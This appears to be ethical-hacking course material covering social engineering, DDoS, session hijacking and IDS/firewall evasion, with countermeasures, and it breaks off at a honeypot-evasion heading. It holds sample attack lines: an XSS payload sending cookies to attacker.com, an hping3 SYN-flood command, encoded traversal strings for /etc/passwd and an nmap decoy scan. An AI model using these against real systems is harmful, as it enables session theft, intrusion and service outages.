modules.title: Social Engineering
modules.description: Explores the psychological manipulation of people to extract sensitive information, covering various attack vectors including phishing, deepfakes, physical techniques, and effective countermeasures.
objectives: Understand the psychological principles of influence
Identify common social engineering attack vectors
Recognize the role of AI and deepfakes in modern attacks
Describe physical social engineering techniques
Implement comprehensive security awareness training

topics.title: Social Engineering Concepts and Vectors
topics.content:
Social engineering is the art of manipulating people so they give up confidential information. Unlike traditional hacking, which exploits technical vulnerabilities in software or hardware, social engineering exploits human psychology, trust, and error. It is often the easiest and most successful phase of a cyberattack.

Digital and Communication Vectors

  • Phishing: The most common vector. Attackers send fraudulent emails to a massive audience, pretending to be a reputable entity (e.g., a bank, Microsoft, or a delivery service). The goal is to induce panic or curiosity, prompting the victim to click a malicious link (leading to a credential harvesting site) or open an infected attachment.
  • Spear Phishing: A highly targeted and researched form of phishing. Instead of a generic blast, the attacker researches a specific individual or department (often using LinkedIn or company websites). The email is customized with accurate personal details, making it incredibly convincing.
  • Whaling: A subset of spear phishing that specifically targets high-profile, high-value individuals, such as CEOs, CFOs, or senior executives (the "whales"). These attacks are sophisticated because compromising these accounts grants access to highly sensitive corporate data and financial authority.
  • Vishing (Voice Phishing): Attackers use phone calls to extract information. They often use VoIP technology and Caller ID Spoofing to make the call appear as if it is coming from a trusted internal department (like IT Support) or a government agency. The attacker relies on their charisma and social skills to deceive the victim in real-time.
  • Smishing (SMS Phishing): Phishing conducted via SMS text messages. Due to the limited space and the personal nature of mobile phones, users are often less suspicious of malicious links delivered via text, especially those mimicking package deliveries or urgent account alerts.
  • Pretexting: The foundation of many advanced attacks. The attacker fabricates a complex, highly believable scenario (the pretext) to engage the target. For example, an attacker might pose as an external auditor conducting a compliance check, using this authority to request sensitive network diagrams or user lists.

topics.title: Psychological Principles of Influence
topics.content:
Social engineering is highly effective because it leverages intrinsic human behaviors and psychological triggers. Based largely on Dr. Robert Cialdini's principles of persuasion, attackers design their campaigns to manipulate these fundamental traits:

  • Authority: Humans are conditioned from childhood to obey authority figures. Attackers impersonate law enforcement, executives, or IT administrators. A victim is far more likely to bypass security protocols if an email appears to come directly from the CEO ordering an immediate wire transfer.
  • Urgency and Scarcity: The goal is to force the victim into making a rapid decision without critical thought. By imposing a tight deadline (urgency) or threatening the loss of a resource (scarcity), the attacker disables logical reasoning. Examples include: "Your account will be permanently deleted in 24 hours if you do not verify your password" or "Only 3 spots left for the exclusive company bonus program."
  • Social Proof (Consensus): People tend to do things that they see other people doing. An attacker might manipulate a target by implying that their colleagues have already complied with a request. "Hi Sarah, John and Dave from Accounting already sent me their tax forms, I just need yours to finalize the report."
  • Liking and Familiarity: People are easily persuaded by those they like or find familiar. Attackers often compromise a legitimate employee's email account and use it to send malicious links to their contacts. The recipient, trusting their colleague, clicks the link without hesitation.
  • Reciprocation: The inherent human desire to return a favor. An attacker might pose as IT support, call a user, and "fix" a fabricated problem. The attacker then asks for a "small favor" in return, such as the user's password to "finalize the ticket."

topics.title: Deepfakes and AI in Social Engineering
topics.content:
The rapid advancement of Artificial Intelligence (AI) and Machine Learning has revolutionized the sophistication and scale of social engineering attacks, moving them from text-based deception to incredibly realistic audio-visual impersonation.

AI-Generated Phishing

Historically, phishing emails were often identifiable by poor grammar, spelling mistakes, and awkward phrasing, especially if the attacker was a non-native speaker. Today, attackers utilize Large Language Models (LLMs) to automatically generate flawless, highly persuasive, and contextually accurate spear-phishing content at scale. AI can analyze a target's previous public writings (e.g., blog posts or social media) and generate emails that perfectly mimic their tone and writing style.

Business Email Compromise (BEC) and Deepfakes

Business Email Compromise (BEC) is a massive financial threat where an attacker compromises corporate email accounts to conduct fraudulent wire transfers. AI has elevated this through Synthetic Media (Deepfakes).

  • Audio Deepfakes (Voice Cloning): Attackers require only a few seconds of a person's voice (often scraped from corporate YouTube videos or podcasts) to train an AI model. They can then type out a script, and the AI will synthesize it perfectly in the target's voice. This is used in devastating "Vishing 2.0" attacks where an employee receives a phone call from their "CEO" demanding an urgent, confidential wire transfer.
  • Video Deepfakes: Attackers can manipulate video in real-time. In high-profile incidents, finance workers have been tricked into joining video conference calls where every other participant (including the CFO) was an AI-generated deepfake, resulting in the authorization of multi-million dollar payouts to attacker-controlled accounts.

topics.title: Physical Social Engineering
topics.content:
Not all cyberattacks occur across the internet. Physical social engineering involves the attacker being physically present on-site to bypass physical security perimeters and gain direct access to hardware, networks, or confidential documents.

Physical Access Techniques

  • Tailgating and Piggybacking: These involve bypassing access control systems (like badge readers or mantraps). Tailgating is malicious and covert; the attacker closely follows an authorized employee through a secure door before it closes, without the employee's knowledge. Piggybacking exploits human courtesy; the attacker might carry a heavy box, pretend to have forgotten their badge, and ask an employee to "hold the door for them."
  • Dumpster Diving: Trashing is a goldmine for intelligence gathering. Attackers systematically search through an organization's unprotected trash or recycling bins. They look for sensitive information like organizational charts, printed emails containing passwords, hard drives that haven't been properly destroyed, employee directories, and hardware manuals. This information is then used to craft highly targeted spear-phishing campaigns.
  • Shoulder Surfing: The attacker uses direct observation to steal information. This can be as simple as looking over an employee's shoulder while they type their password on a laptop in a coffee shop, or using binoculars to observe screens through an office window. It is particularly effective for capturing PIN codes and multi-factor authentication (MFA) tokens.
  • Baiting: The attacker leaves physical media infected with malware (like USB drives labeled "Executive Salaries Q3" or "Layoff List") in prominent locations like the company parking lot or breakroom. The attack relies entirely on an employee's curiosity to pick up the drive and plug it into a corporate workstation, instantly deploying the malware behind the firewall.

topics.title: Social Engineering Countermeasures
topics.content:
Because social engineering targets human vulnerability, technical defenses (like firewalls and antivirus) are often completely bypassed. Defense relies heavily on human elements, strict policies, and architectural shifts.

Education and Testing

  • Security Awareness Training: The absolute most critical countermeasure. Employees must be continuously educated on the latest social engineering tactics, how to recognize phishing indicators (e.g., verifying the actual sender address, hovering over links), and the dangers of over-sharing on social media. Training must be ongoing, not an annual compliance checkbox.
  • Phishing Simulations: Organizations use tools like GoPhish or the Social-Engineer Toolkit (SET) to regularly send benign, simulated phishing emails to their own employees. This safely identifies vulnerable users, provides immediate localized training, and measures the overall security posture of the human firewall over time.

Policies and Architecture

  • Out-of-Band Verification: A strict policy must be enforced for sensitive actions (like changing bank account details for a vendor, resetting executive passwords, or approving large wire transfers). If a request comes via email, the verification must happen "out-of-band" via a completely different communication channel (e.g., a phone call to an established, known internal number). This defeats BEC and email compromise.
  • Robust Email Authentication: Implementing DMARC, SPF, and DKIM on the corporate domain prevents attackers from spoofing the organization's email addresses, significantly reducing the success rate of internal phishing campaigns.
  • Zero Trust Architecture (ZTA): Operating under the assumption that the network is already compromised. Zero Trust requires strict identity verification for every person and device attempting to access resources, regardless of whether they are sitting inside or outside the corporate office. If an employee falls victim to phishing, ZTA limits the "blast radius" by ensuring the attacker cannot automatically pivot to critical systems.

modules.title: Denial-of-Service
modules.description: Covers DoS and DDoS attack concepts, techniques, and tools including volumetric, protocol, and application-layer attacks, along with mitigation strategies.
objectives: Differentiate between DoS and DDoS attacks
Classify attack types: volumetric, protocol, and application-layer
Understand botnet architecture and amplification techniques
Explain specific attacks like SYN flood, UDP flood, and Slowloris
Implement DoS/DDoS detection and countermeasures

topics.title: DoS vs. DDoS and Botnet Architecture
topics.content:
The objective of a Denial-of-Service attack is to exhaust the resources of a target system, network, or application, rendering it unavailable to its legitimate users. These attacks do not aim to steal data or establish persistence; they are purely disruptive, often used for extortion, hacktivism, or as a smokescreen to distract security teams while a more targeted breach occurs elsewhere.

DoS vs. DDoS

A Denial-of-Service (DoS) attack is a one-to-one attack. It originates from a single attacker system (or a single internet connection) targeting a single victim. These are relatively easy to mitigate because the victim's firewall can quickly identify the single malicious IP address and block it.

A Distributed Denial-of-Service (DDoS) attack is a many-to-one attack. It leverages hundreds of thousands of geographically distributed systems to simultaneously flood the target. Because the attack traffic originates from countless different IP addresses worldwide, simple IP blocking is completely ineffective. The sheer volume of traffic easily overwhelms the target's network bandwidth or processing capacity.

Botnets and Command & Control

DDoS attacks are powered by Botnets (Robot Networks). A botnet is a vast army of compromised computers, servers, or Internet of Things (IoT) devices. These compromised machines are referred to as "bots" or "zombies."

  • Command and Control (C2): The attacker (Botmaster) does not communicate with the zombies directly. Instead, they use a centralized (or sometimes peer-to-peer) Command and Control infrastructure. The botmaster sends attack instructions to the C2 servers, which rapidly disseminate the orders to the millions of zombies to commence firing at the target simultaneously.
  • The Mirai Botnet: A pivotal moment in DDoS history. Unlike traditional botnets composed of compromised Windows PCs, Mirai specifically targeted vulnerable Linux-based IoT devices (like IP cameras, DVRs, and home routers). It scanned the internet for open Telnet ports (23) and logged in using a hardcoded dictionary of factory-default credentials (e.g., admin/admin, root/12345). Mirai amassed immense power, launching record-breaking attacks exceeding 1 Terabit per second (Tbps), taking down major DNS providers and bringing down large sections of the internet.

topics.title: Volumetric and Protocol Attacks
topics.content:
DDoS attacks are generally categorized by the OSI layer they target. Layer 3 (Network) and Layer 4 (Transport) attacks aim to consume raw bandwidth or exhaust network infrastructure processing capabilities.

Volumetric Attacks

The goal is absolute bandwidth saturation. The attacker sends more data than the victim's internet connection pipe can handle. If a company has a 10 Gbps internet connection, and the attacker sends 40 Gbps of junk data, legitimate traffic simply cannot get through.

  • UDP Floods: The User Datagram Protocol (UDP) is connectionless. The attacker sends massive amounts of large UDP packets to random ports on the target. The target server must process the packet, determine no application is listening on that port, and attempt to reply with an ICMP Destination Unreachable packet. This rapidly consumes the target's CPU and bandwidth.
  • ICMP Floods (Ping Floods): Flooding the target with ICMP Echo Requests to exhaust inbound and outbound bandwidth.

Protocol Attacks (State-Exhaustion)

These attacks do not necessarily require massive bandwidth. Instead, they target the state-tracking tables of firewalls, load balancers, and servers.

  • TCP SYN Flood: The most prevalent protocol attack. It exploits the fundamental TCP three-way handshake (SYN, SYN-ACK, ACK). The attacker (often using a tool like hping3 -S --flood -V -p 80 192.168.1.1) sends a massive torrent of SYN requests with spoofed source IPs. The victim server responds with a SYN-ACK and allocates memory in its connection table, waiting for the final ACK. Because the source IPs are spoofed, the ACK never arrives. The server's connection table rapidly fills with these "half-open" connections. Once the table is full, the server crashes or drops all legitimate new connection requests.
  • Fragmentation Attacks: e.g., the Teardrop attack. The attacker sends fragmented IP packets with overlapping offsets or malformed payload sizes. When the target's operating system attempts to reassemble the packets, the illogical offsets cause a buffer overflow or kernel panic, crashing the system.

topics.title: Amplification and Reflection Attacks
topics.content:
Amplification and Reflection attacks are specialized, highly devastating forms of volumetric DDoS. They exploit connectionless UDP protocols to multiply the attacker's traffic volume massively while hiding the attacker's true identity.

The Mechanism

  1. Spoofing: The attacker crafts a request packet (e.g., a DNS query) but alters the source IP address in the packet header to be the IP address of the Victim.
  2. Reflection: The attacker sends this spoofed request to thousands of vulnerable, publicly accessible servers on the internet (the reflectors). The servers process the request and send the response back to the spoofed source IP (the Victim). The traffic is "reflected" off legitimate servers.
  3. Amplification: The attacker specifically crafts the request so that the response generated by the server is vastly larger than the original request.

Common Amplification Vectors

  • DNS Amplification: The attacker sends a tiny UDP DNS query (e.g., 60 bytes) requesting all available records (an ANY query) or utilizing DNSSEC. They send this to open DNS resolvers. The resolver responds with a massive packet containing all records and cryptographic signatures, which can be up to 4000 bytes. This creates an amplification factor of 50x to 70x. The victim is suddenly crushed by thousands of massive DNS responses they never requested.
  • NTP Amplification: Exploits older Network Time Protocol (NTP) servers using the monlist command. A tiny request to the server commands it to return the IP addresses of the last 600 machines that connected to it. The response is enormous, yielding an amplification factor of over 500x.
  • Memcached Amplification: Historically one of the most powerful vectors, exploiting exposed Memcached database servers running on UDP port 11211. Attackers could achieve amplification factors exceeding 51,000x, generating terabit-scale attacks.

topics.title: Application Layer Attacks
topics.content:
Layer 7 (Application Layer) DDoS attacks are the most sophisticated. Rather than trying to fill a network pipe, they target the application itself (like a web server or database). They require extremely low bandwidth and closely mimic legitimate user behavior, making them incredibly difficult to detect and mitigate.

HTTP Floods

The attacker's botnet sends thousands of seemingly legitimate HTTP GET or POST requests. For example, commanding the botnet to repeatedly search a massive database via a web form or constantly request complex, un-cached PDF documents. While the network bandwidth used is minimal, the backend database and web servers exhaust their CPU and memory processing the complex requests, causing the site to crash.

Slow-Rate Attacks (Low and Slow)

These attacks operate by opening connections to a web server and keeping them open as long as possible, exhausting the server's concurrent connection limit.

  • Slowloris: A classic tool. It establishes multiple connections to the target web server and sends a partial HTTP request. It then slowly, periodically sends tiny HTTP headers to keep the connection alive but never sends the final blank line (\r\n\r\n) that indicates the request is complete. The web server keeps the connection thread open, waiting. Eventually, the server reaches its maximum connection limit and denies service to legitimate users.
  • RUDY (R-U-Dead-Yet): Operates on HTTP POST requests. It submits a web form but sets the Content-Length header to an artificially massive number. It then slowly feeds the actual data in one byte at a time at agonizingly slow intervals. The server is forced to hold the connection open waiting for the rest of the promised data.

topics.title: DoS/DDoS Countermeasures
topics.content:
Mitigating DDoS, especially volumetric attacks, cannot be done effectively with on-premise firewalls alone, as the internet pipe to the building will be saturated before the firewall even sees the traffic. It requires massive infrastructure and ISP cooperation.

Architectural Defenses

  • Content Delivery Networks (CDNs) and Cloud Scrubbing: The most effective defense against modern DDoS. Organizations route their traffic through globally distributed networks like Cloudflare or Akamai. These networks have immense bandwidth capacity (Tbps) capable of absorbing massive volumetric attacks. They act as a reverse proxy, inspecting traffic, dropping bad packets, and only forwarding clean traffic to the origin server.
  • Anycast Routing: Often used by CDNs and DNS root servers, Anycast allows multiple servers globally to share the exact same IP address. When an attacker launches a DDoS attack, the internet routing protocols (BGP) naturally disperse the attack traffic to the nearest Anycast nodes worldwide, diluting the attack's power across the global network rather than focusing it on a single point.

Protocol and Configuration Defenses

  • SYN Cookies: The definitive countermeasure for SYN Floods. When enabled, the server does not immediately allocate memory upon receiving a SYN request. Instead, it mathematically hashes the connection details into the sequence number of the SYN-ACK response (the "cookie"). The server only allocates memory if the client replies with the final ACK containing the correct hash. This completely neutralizes state-exhaustion from spoofed IPs.
  • Ingress Filtering (BCP38): A network administration best practice implemented by ISPs. The router inspects the source IP of packets leaving a network. If the source IP does not belong to the internal network (meaning it is spoofed), the router drops the packet. Widespread adoption of Ingress Filtering fundamentally breaks reflection and amplification attacks by preventing the spoofing required for them to work.
  • Web Application Firewalls (WAF): Essential for mitigating Layer 7 attacks like HTTP Floods and Slowloris. WAFs understand application logic and can implement aggressive rate limiting, CAPTCHAs, and behavioral blocking of malicious HTTP patterns.

v13Updates: AI-driven adaptive DDoS attacks (evading WAFs dynamically)

modules.title: Session Hijacking
modules.description: Covers techniques for intercepting and taking over authenticated user sessions at both the network and application level, including session token prediction, XSS-based theft, session fixation, and blind hijacking.
objectives: Understand session hijacking concepts at network and application layers
Explain session token prediction and brute-forcing techniques
Perform XSS-based session theft and session fixation attacks
Describe man-in-the-browser and cross-site request forgery attacks
Implement session management countermeasures
Analyze CRIME and BREACH attacks on compressed HTTPS sessions

topics.title: Session Hijacking Concepts
topics.content:
Introduction to Session Hijacking

Session hijacking, sometimes referred to as cookie hijacking, is an exploitation technique where an attacker aims to take over an established session between a user and a server. By stealing, predicting, or otherwise manipulating a valid session token, the attacker is able to completely bypass the authentication process and impersonate the legitimate user. This means the attacker does not need to crack passwords or perform social engineering to obtain credentials; they simply steal the temporary "key" (the session token) that represents the user's active session.

Session hijacking can be categorized fundamentally by the layer at which it operates (Application Layer vs. Network Layer) and by the attacker's level of engagement (Active vs. Passive vs. Blind).

Active, Passive, and Blind Hijacking

  • Active Hijacking: In this form of attack, the attacker takes over an existing session and directly interacts with the server, effectively impersonating the victim. The attacker typically silences the legitimate client to prevent interference, often by employing a Denial-of-Service (DoS) attack or manipulating ARP caches so that the victim's packets do not reach the server, preventing the victim from sending RST (Reset) packets that could terminate the hijacked session.
  • Passive Hijacking: Here, the attacker does not actively interact with the server. Instead, they silently monitor the session, capturing sensitive data such as unencrypted cookies, personal information, or proprietary data transmitted during the session. Sniffing tools like Wireshark are commonly used in passive hijacking.
  • Blind Hijacking: This occurs when an attacker can inject malicious data or commands into an authenticated session but cannot see the server's response. This typically happens when the attacker is not on the same network segment as the victim or server. The attacker relies on predicting sequence numbers to inject packets, blindly trusting that the commands will be executed (e.g., changing a password or executing a remote command).

The Role of the Session Token

The session token (often a cookie, such as PHPSESSID or JSESSIONID) is the linchpin of session management in stateless protocols like HTTP. Once a user successfully authenticates, the server generates this token and sends it to the client. The client then includes this token in all subsequent requests. If an attacker acquires this token, the server has no native way to distinguish between the legitimate user and the attacker, treating both as the authenticated identity.

topics.title: Application-Level Session Attacks
topics.content:
Exploiting the Application Layer

Application-level hijacking targets the mechanisms applications use to maintain state, primarily focusing on session IDs transported via cookies, URL parameters, or hidden form fields.

Session Fixation

In a Session Fixation attack, the attacker forces a predetermined, known session ID onto a victim before the victim authenticates. The sequence is typically as follows:

  1. The attacker visits the target application and receives a valid session ID (e.g., SID=12345).
  2. The attacker tricks the victim into using this specific session ID, often by sending a malicious link (e.g., http://target.com/login?SID=12345).
  3. The victim clicks the link, navigates to the login page, and authenticates using their credentials.
  4. If the application fails to regenerate a new session ID upon successful login and continues using SID=12345, the session is now authenticated under the victim's account.
  5. The attacker, who already knows SID=12345, can now use it to access the victim's authenticated session.

Session Prediction and Brute-Forcing

Session Prediction exploits weak token generation algorithms. If a server constructs tokens using predictable values—such as appending the username to a current timestamp (e.g., admin_1689456000)—or utilizes non-cryptographic pseudo-random number generators (PRNGs), an attacker can predict future session tokens. Alternatively, if the token space is extremely small, an attacker might brute-force the session ID by systematically sending thousands of requests with different IDs until one succeeds.

XSS-Based Cookie Theft

Cross-Site Scripting (XSS) is a potent vector for session hijacking. If an application is vulnerable to Stored or Reflected XSS, an attacker can inject a malicious script into the victim's browser. When executed, this JavaScript can access the document.cookie object and exfiltrate the session token to an attacker-controlled server.

<script>new Image().src='http://attacker.com/steal?c=' + document.cookie;</script>

This stealthily sends the victim's cookies to the attacker.

Man-in-the-Browser (MitB)

A Man-in-the-Browser (MitB) attack involves a Trojan horse operating directly inside the victim's web browser process (e.g., via a malicious extension or compromised browser executable). Because the malware resides within the browser, it intercepts and modifies web page content and transaction data in real-time before it is encrypted by SSL/TLS, and after it is decrypted. This effectively defeats transport layer encryption (HTTPS) and allows the attacker to steal session data, manipulate banking transactions, and harvest credentials.

Session Replay

In a Session Replay attack, an attacker uses proxy tools like Burp Suite or OWASP ZAP to intercept a legitimate session token and later "replay" it to the server. If the session has not timed out or been invalidated, the server will grant access.

CRIME and BREACH Attacks

These advanced attacks exploit vulnerabilities in data compression mechanisms used alongside encryption.

  • CRIME (Compression Ratio Info-leak Made Easy): Exploits TLS compression. By injecting known plaintext into a victim's request and observing the size of the compressed, encrypted payload, the attacker can deduce the contents of secret session cookies based on how the compression algorithm handles repeated byte sequences.
  • BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext): Similar to CRIME, but targets HTTP compression (like gzip) rather than TLS compression. It requires the attacker to view the encrypted traffic, force the victim to visit a specific site, and observe changes in response sizes to extract CSRF tokens or session IDs.

topics.title: Network-Level Session Hijacking
topics.content:
Intercepting at the Transport Layer

Network-level session hijacking involves intercepting and manipulating transport-layer protocols, primarily TCP and UDP, to take over communications between a client and server.

TCP Session Hijacking

To successfully inject malicious packets into an active TCP session (and have them accepted by the receiving host), the attacker must accurately predict or observe the TCP sequence numbers (SEQ) and acknowledgment numbers (ACK) currently in use. TCP uses these 32-bit sequence numbers to ensure packets are received in order and reassembled correctly.

If an attacker injects a packet with an incorrect sequence number, the receiving host will consider it out-of-order or duplicate, resulting in the packet being dropped and a duplicate ACK being sent. If the sequence number is wildly off, it may trigger a RST (Reset) packet, tearing down the connection entirely. Thus, sequence number prediction is the crux of TCP hijacking.

ARP Spoofing / Poisoning

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network. Because ARP is stateless and lacks authentication, it is highly vulnerable to spoofing.

An attacker can broadcast forged ARP replies, mapping their own MAC address to the IP address of the default gateway (the router). Consequently, all victims on the subnet will send their outbound traffic to the attacker's machine instead of the real router. This places the attacker in a perfect Man-in-the-Middle (MitM) position. From here, the attacker can perform network sniffing, modify TCP traffic in transit, or selectively drop packets to facilitate a session hijack.

Network Sniffing and SSL Stripping

Attackers utilize network protocol analyzers like Wireshark or tcpdump to sniff network traffic. If session cookies are transmitted over unencrypted HTTP, they appear in plain text and are easily extracted.

To combat encryption, attackers use techniques like SSL Stripping (often using tools like sslstrip or Bettercap). SSL Stripping intercepts the victim's initial HTTP request and prevents the browser from upgrading to a secure HTTPS connection. The attacker maintains an HTTPS connection with the server but serves the victim an unencrypted HTTP version, allowing all session data and credentials to be sniffed in plain text.

topics.title: Session Hijacking Countermeasures
topics.content:
Comprehensive Defense-in-Depth for Session Management

Securing sessions requires a multi-layered approach addressing both application design and network architecture.

Secure Token Generation and Management

  • Cryptographically Secure PRNGs (CSPRNG): Session tokens must be generated using robust cryptographic algorithms that guarantee high entropy and randomness, rendering session prediction mathematically infeasible.
  • Session Regeneration: To thwart session fixation attacks, the application must generate a brand new session ID immediately upon a successful user login, while explicitly invalidating the pre-authentication session ID.
  • Absolute and Idle Timeouts: Implement strict timeouts. An idle timeout logs the user out after a period of inactivity. An absolute timeout forces a re-authentication after a set maximum duration, regardless of activity, limiting the window of opportunity for an attacker using a stolen token.

Cookie Security Attributes

Modern web browsers support specific attributes that secure how cookies are handled:

  • HttpOnly Flag: Setting the HttpOnly attribute instructs the browser that the cookie must not be accessible via client-side scripts (e.g., JavaScript's document.cookie). This is a critical, primary defense against XSS-based session theft.
  • Secure Flag: The Secure attribute ensures the cookie is only transmitted over encrypted (HTTPS) connections, preventing interception via passive network sniffing on unencrypted Wi-Fi or LANs.
  • SameSite Attribute: Setting SameSite=Strict or SameSite=Lax controls when cookies are sent with cross-site requests, providing robust protection against Cross-Site Request Forgery (CSRF) and certain types of cross-site tracking.

Network and Architectural Defenses

  • Token Binding and Fingerprinting: Associate the session token with specific client attributes (e.g., IP address subnet, User-Agent string, or TLS client certificate). If a token is stolen and presented from a vastly different IP address or browser type, the server should invalidate the session and prompt for re-authentication.
  • Avoid URL-Based Tracking: Never pass session IDs in GET parameters (e.g., /dashboard?session=123). These tokens easily leak through HTTP Referer headers to external sites, browser history, proxy server logs, and shoulder surfing.
  • HTTP Strict Transport Security (HSTS): Implement HSTS headers to mandate that browsers only interact with the application over HTTPS, effectively preventing downgrade attacks like SSL stripping.
  • Encryption in Transit: Use strong encryption protocols (IPsec, VPNs, TLS 1.3) across all network layers to protect data in transit from being sniffed or altered.

v13Updates: Advanced token prediction with machine learning
Modern SSO and OAuth hijacking techniques

modules.title: Evading IDS, Firewalls, and Honeypots
modules.description: Explains how intrusion detection systems, firewalls, and honeypots work, and covers various evasion techniques used by attackers to bypass these security controls.
objectives: Understand IDS, IPS, and firewall architectures and detection methods
Perform IDS evasion using fragmentation, obfuscation, encryption, and desynchronization
Bypass firewall rules using tunneling, covert channels, and source routing
Identify and evade honeypots and honeynets
Understand NAC and endpoint security evasion

topics.title: IDS/IPS and Firewall Concepts
topics.content:
Intrusion Detection and Prevention Systems

Security monitoring and filtering rely on the proper placement and configuration of defensive appliances.

Intrusion Detection System (IDS): An IDS is a passive monitoring solution designed to identify and alert on suspicious activities, policy violations, or known threats across a network or host. It generates alerts but does not actively block traffic. Detection methods primarily fall into two categories:

  • Signature-Based: Compares network packets against a database of known threat signatures (similar to antivirus definitions). It is highly accurate for known attacks but blind to zero-days.
  • Anomaly-Based (Behavioral): Establishes a baseline of normal network activity and triggers alerts when traffic deviates significantly from this baseline. This can detect zero-day exploits but is prone to false positives.

Intrusion Prevention System (IPS): Unlike an IDS, an IPS sits inline (directly in the flow of traffic) and has the capability to actively block, drop, or reset connections containing malicious packets in real-time.

Sensor Placement and Architecture

For an IDS to provide maximum visibility without impacting network performance, its sensors must be properly positioned.

An IDS sensor is typically connected to a SPAN (Switched Port Analyzer) port or a mirror port on a network switch. The switch is configured to send a duplicate copy of all traffic passing through it to the SPAN port. Alternatively, a hardware network tap can be physically inserted into a network cable to copy the traffic. This out-of-band monitoring ensures the IDS sees everything passively.

Firewall Architectures

Firewalls enforce access control policies by filtering traffic between network segments.

  • Packet Filtering (Stateless): Operates at Layer 3 and 4, filtering based solely on source/destination IP addresses, ports, and protocols. It does not track connection context.
  • Stateful Inspection: Operates at Layer 4 and above. It maintains a state table tracking the status of active connections (e.g., TCP handshakes, sequence numbers) and only allows packets that belong to an established, valid session.
  • Application-Level Gateways / Proxy Firewalls: Operates at Layer 7. They terminate the client connection, inspect the application payload (e.g., HTTP, FTP), and initiate a separate connection to the server. Web Application Firewalls (WAFs) are a specialized type focused on HTTP/HTTPS traffic.

Demilitarized Zone (DMZ): A logical subnetwork that contains and exposes an organization's external-facing services (like web, DNS, and email servers) to an untrusted network (the internet), while strictly isolating the internal LAN from direct external access.

topics.title: IDS Evasion Techniques
topics.content:
Bypassing Deep Packet Inspection

Attackers employ complex packet manipulation techniques to bypass IDS inspection, aiming to confuse the sensor so it fails to recognize the malicious payload, while ensuring the target host still processes the attack successfully.

Fragmentation and Overlapping

Fragmentation Attacks: Attackers fragment malicious payloads into extremely small IP pieces. Tools like Nmap allow this using the -f (8-byte chunks) or -ff (16-byte chunks) flags. Older or poorly configured IDS systems may struggle to reassemble these fragments correctly or fast enough, allowing the payload to slip through uninspected. The target host, however, performs standard IP reassembly and reconstructs the malicious payload.

Overlapping Fragments: An advanced variant where subsequent packet fragments are crafted to overwrite portions of previous fragments during the reassembly process. If the IDS and the target operating system handle overlapping fragments differently (e.g., favoring the first fragment vs. the last fragment), the IDS might assemble a completely benign string (and ignore it), while the target host assembles the actual malicious exploit.

Time-To-Live (TTL) Evasion

TTL-Based Insertion Attacks: The attacker intentionally injects extra, "garbage" packets into the stream with carefully calculated, low Time-To-Live (TTL) values. Because the IDS is physically closer to the attacker than the target host, these garbage packets reach the IDS but expire (TTL hits zero) and are dropped by routers before reaching the target host.

The IDS reassembles a mixed, corrupted payload (preventing signature matching), but the target host receives only the malicious packets, successfully executing the attack.

Obfuscation and Encoding

Attackers encode payloads to evade static signature matching. For example, a directory traversal attack like /../../etc/passwd can be encoded:

  • URL Encoding: %2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
  • Unicode Encoding: /%u002e%u002e/%u002e%u002e/etc/passwd

If the IDS engine fails to decode these specific formats, the attack slips through unseen.

Polymorphic Shellcode

Advanced exploits utilize Polymorphic Shellcode, which employs self-modifying code techniques. The shellcode is encrypted or encoded differently every single time it is generated, and includes a small decoder stub. Because the binary pattern changes completely with each execution, no two instances share the same byte sequence. This renders traditional signature-based IDS completely useless against polymorphic attacks.

Scanning Evasion (Decoys and Timing)

During the reconnaissance phase, attackers must evade detection.

  • Decoy IP Addresses: Using Nmap, the command nmap -D RND:10 <target> generates 10 random spoofed IP addresses alongside the attacker's real IP. This floods the IDS logs with scans from multiple sources, hiding the actual origin in the noise.
  • Timing Adjustments: IDS systems often trigger alerts based on rate limits (e.g., >100 port connections per second). Using Nmap's paranoid timing mode (-T0 or -T1), the scan is slowed down drastically (waiting minutes between probes), staying below the IDS detection threshold.

topics.title: Firewall Bypass and Tunneling
topics.content:
Circumventing Perimeter Defenses

Firewalls restrict traffic based on predefined rules. When an attacker is blocked from direct access (e.g., port 4444 is blocked for a reverse shell), they must bypass the rules using encapsulation, spoofing, or routing manipulation.

Tunneling and Encapsulation

  • HTTP/HTTPS Tunneling: Most corporate firewalls allow outbound web traffic (ports 80 and 443). An attacker can encapsulate alternative protocols, malware command-and-control (C2) traffic, or a reverse shell inside standard HTTP or HTTPS packets. To the firewall, it looks like legitimate web browsing, effectively bypassing port-based restrictions.
  • ICMP Tunneling: If ping (ICMP Echo Request/Reply) is allowed through the firewall for diagnostic purposes, an attacker can establish a covert channel by injecting arbitrary data directly into the payload section of the ICMP packets.
  • SSH Tunneling (Port Forwarding): An attacker creates an encrypted SSH connection to an external remote server. They can then forward local or remote ports through this encrypted tunnel. Because the traffic is encrypted, deep packet inspection (DPI) firewalls cannot read the contents and typically allow it.

Source Routing

Normally, routers determine the best path for a packet. Source Routing is a technique where the sender specifies the exact route (the list of router IP addresses) a packet should take through the network. An attacker could use this to force packets along a path that deliberately routes around a firewall or IDS inspection point. However, due to its inherent security risks, most modern routers drop source-routed packets by default.

MAC and IP Spoofing

Attackers fake the source IP or MAC address in their packet headers to appear as a trusted, internal machine. This can bypass Access Control Lists (ACLs) on routers and firewalls that trust specific IP ranges or MAC addresses. Spoofing is particularly effective in UDP-based attacks, as UDP does not require a handshake.

ACK Scanning

An attacker sends TCP packets with only the ACK flag set (e.g., using Nmap's -sA). The purpose is not to discover open ports, but to map out the firewall ruleset. A stateful firewall will typically drop an unsolicited ACK packet because it doesn't belong to an established session. However, a simple stateless packet filter might allow it through based on a port rule. By analyzing the responses (or lack thereof), the attacker infers the firewall's architecture.

topics.title: Honeypots and Honeynets
topics.content:
Deception Technology

Honeypots are decoy systems, servers, or applications intentionally deployed to attract attackers. They contain no legitimate production value; therefore, any interaction with a honeypot is inherently suspicious. They are used to log attacker behavior, capture malware samples (like zero-days), and waste the attacker's time and resources. Honeynets are entire networks comprising multiple honeypots, simulating a complete corporate infrastructure.

High-Interaction vs. Low-Interaction

  • High-Interaction Honeypots: These are fully functional, real operating systems and services (e.g., a real Windows server with vulnerable software). They provide a highly realistic environment, allowing security researchers to capture detailed information about advanced exploitation techniques, post-exploitation lateral movement, and rootkits. However, they are complex to maintain and carry a high risk—if the attacker compromises the honeypot, they might use it as a pivot point to attack the real network.
  • Low-Interaction Honeypots: These systems (like the tool Honeyd) do not run real operating systems. Instead, they use software to emulate specific services and protocols (e.g., faking an FTP banner or simulating an open SSH port). They provide limited insight because the attacker cannot achieve deep OS access, but they are very low risk and easy to deploy.

Honeypot Evasion and Detection

